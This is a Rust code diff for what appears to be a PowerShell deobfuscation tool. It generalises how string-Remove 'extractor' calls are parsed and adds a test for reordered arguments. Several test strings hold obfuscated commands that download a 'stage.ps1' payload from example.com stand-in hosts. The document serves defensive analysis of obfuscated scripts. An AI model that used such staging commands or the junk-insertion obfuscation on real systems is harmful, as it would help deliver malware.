@@ -3578,6 +3578,7 @@ fn expand_literal_remove_extractor_calls(text: &str) -> String {
             let binding = PsRemoveExtractorParamBinding {
                 value_idx,
                 value_name: value_var,
+                arg_count: param_index.len(),
                 start_idx,
                 start_name: start_var,
                 count_idx,
@@ -4690,6 +4691,7 @@ fn inline_ps_named_literal_substring_call(
 struct PsRemoveExtractorParamBinding<'a> {
     value_idx: usize,
     value_name: &'a str,
+    arg_count: usize,
     start_idx: usize,
     start_name: &'a str,
     count_idx: Option<usize>,
@@ -4740,62 +4742,13 @@ fn inline_ps_literal_remove_calls(
                     continue;
                 }
             }
-            let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
+            let Some((call_end, value, start, count)) =
+                parse_ps_positional_literal_remove_args(text, pos, parenthesized, binding)
+            else {
                 search_from = end_name;
                 continue;
             };
-            pos = skip_ps_arg_separator(bytes, first_end, parenthesized);
-            let Some((second_end, second)) = parse_ps_literal_or_usize_arg(text, pos) else {
-                search_from = first_end;
-                continue;
-            };
-            let (third, mut call_end) = if binding.count_idx.is_some() {
-                pos = skip_ps_arg_separator(bytes, second_end, parenthesized);
-                let Some((third_end, third)) = parse_ps_literal_or_usize_arg(text, pos) else {
-                    search_from = second_end;
-                    continue;
-                };
-                (Some(third), third_end)
-            } else {
-                (None, second_end)
-            };
-            if parenthesized {
-                let after = skip_ascii_ws(bytes, call_end);
-                if bytes.get(after) != Some(&b')') {
-                    search_from = call_end;
-                    continue;
-                }
-                call_end = after + 1;
-            }
-
-            let arg_at = |idx: usize| match idx {
-                0 => Some(&first),
-                1 => Some(&second),
-                2 => third.as_ref(),
-                _ => None,
-            };
-            let Some(value) = arg_at(binding.value_idx).and_then(PsLiteralOrUsizeArg::as_str)
-            else {
-                search_from = call_end;
-                continue;
-            };
-            let Some(start) = arg_at(binding.start_idx).and_then(PsLiteralOrUsizeArg::as_usize)
-            else {
-                search_from = call_end;
-                continue;
-            };
-            let count = if let Some(count_idx) = binding.count_idx {
-                match arg_at(count_idx).and_then(PsLiteralOrUsizeArg::as_usize) {
-                    Some(count) => Some(count),
-                    None => {
-                        search_from = call_end;
-                        continue;
-                    }
-                }
-            } else {
-                None
-            };
-            let Some(replacement) = ps_literal_remove_replacement(value, start, count) else {
+            let Some(replacement) = ps_literal_remove_replacement(&value, start, count) else {
                 search_from = call_end;
                 continue;
             };
@@ -4810,6 +4763,57 @@ fn inline_ps_literal_remove_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+fn parse_ps_positional_literal_remove_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    binding: PsRemoveExtractorParamBinding<'_>,
+) -> Option<(usize, String, usize, Option<usize>)> {
+    if binding.arg_count == 0
+        || binding.arg_count > 8
+        || binding.value_idx >= binding.arg_count
+        || binding.start_idx >= binding.arg_count
+        || binding
+            .count_idx
+            .is_some_and(|idx| idx >= binding.arg_count)
+    {
+        return None;
+    }
+
+    let bytes = text.as_bytes();
+    let mut value = None;
+    let mut start = None;
+    let mut count = None;
+    let mut arg_end = pos;
+    for idx in 0..binding.arg_count {
+        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
+        if idx == binding.value_idx {
+            value = Some(arg.as_str()?.to_string());
+        }
+        if idx == binding.start_idx {
+            start = Some(arg.as_usize()?);
+        }
+        if binding.count_idx == Some(idx) {
+            count = Some(arg.as_usize()?);
+        }
+        arg_end = next_end;
+        pos = next_end;
+        if idx + 1 < binding.arg_count {
+            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
+        }
+    }
+
+    if parenthesized {
+        let after = skip_ascii_ws(bytes, arg_end);
+        if bytes.get(after) != Some(&b')') {
+            return None;
+        }
+        arg_end = after + 1;
+    }
+
+    Some((arg_end, value?, start?, count))
 }
 
 fn inline_ps_named_literal_remove_call(
@@ -9369,6 +9373,23 @@ Cut 'Invoke-JUNKWebRequest -Uri https://ps-remove-extractor.example/stage.ps1' 7
         assert!(
             out.contains(&format!("'{decoded}'")),
             "literal remove extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_remove_extractor_reordered_call_is_rewritten() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1";
+        let text = r#"function Cut($unused,$value,$start,$count) {
+  return $value.Remove($start,$count)
+}
+Cut 0 'Invoke-JUNKWebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1' 7 4"#;
+
+        let out = expand_literal_remove_extractor_calls(text);
+
+        assert!(
+            out.contains(&format!("'{decoded}'")),
+            "literal reordered remove extractor call was not rewritten:\n{out}"
         );
     }
 
